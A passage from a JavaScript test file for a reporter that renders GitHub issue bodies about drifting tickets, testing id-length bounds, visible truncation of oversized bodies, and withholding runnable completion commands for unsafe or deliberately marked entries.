  const body = renderIssueBody([{ id: longId, reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' }]);
  assert.deepEqual(readyCommandIds(body), [], 'an over-long id must not become a runnable command');
  assert.match(body, /cannot be safely/, 'and it is surfaced as unsafe, not silently dropped');
});

test('an id at the length bound is still rendered', () => {
  const okId = 'T' + 'x'.repeat(127); // 128 chars total
  const body = renderIssueBody([{ id: okId, reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' }]);
  assert.deepEqual(readyCommandIds(body), [okId]);
});

// ---- aggregate body size is bounded (round-20 finding) ----
//
// Per-field/per-id caps bound one entry, but the NUMBER of drifting tickets and
// the NUMBER of rails per ticket are both unbounded. An over-limit body fails
// every GitHub create/update and silently disables the reporter. Both are capped,
// with visible "omitted"/"truncated" notices — never a silent cut.
import { MAX_BODY } from '../ceremony-drift.mjs';

test('a ticket with very many rails shows a bounded list with an omitted-count', () => {
  const rails = Array.from({ length: 100 }, (_, i) => `packages/x${i}/**`);
  const body = renderIssueBody([{ id: 'T7', reason: 'inferred: x', rails, blocker: 'rails-freeze' }]);
  assert.match(body, /…and 75 more/, 'omitted rails are counted, not dropped silently');
});

test('a very large drift set clamps the body under the GitHub limit, marker preserved', () => {
  const many = Array.from({ length: 5000 }, (_, i) => ({
    id: `T${i}`, reason: 'inferred: x', rails: ['packages/core/**'], blocker: 'rails-freeze',
  }));
  const body = renderIssueBody(many);
  assert.ok(body.length <= MAX_BODY, `body ${body.length} must be <= ${MAX_BODY}`);
  assert.match(body, /was truncated/, 'truncation is visible, not silent');
  assert.ok(body.includes(MARKER), 'the discovery marker survives truncation');
});

test('the clamp is deterministic (idempotence holds for over-limit bodies)', () => {
  const many = Array.from({ length: 5000 }, (_, i) => ({
    id: `T${i}`, reason: 'inferred: x', rails: ['a/**'], blocker: 'rails-freeze',
  }));
  assert.equal(renderIssueBody(many), renderIssueBody(many));
});

// ---- a railed completed:false ticket is never advertised for completion ----
//
// The producer routes a ticket with a deliberately-set `completed` value to
// blocker 'preexisting-completed-field' (see detect.mjs), even when it freezes
// rails. The reporter must then keep it OUT of the runnable-command path — a
// command would overwrite the deliberate value and expire rails the author kept
// on purpose. Round-21 finding.
test('a railed preexisting-completed-field entry gets no runnable command', () => {
  const body = renderIssueBody([
    { id: 'SEC', reason: 'explicit status: "done"', rails: ['security/**'], blocker: 'preexisting-completed-field' },
  ]);
  assert.deepEqual(readyCommandIds(body), [], 'must not advertise completing a deliberate completed value');
  assert.match(body, /## Needs a manual decision/);
  assert.match(body, /will \*\*not\*\* clear/);
});
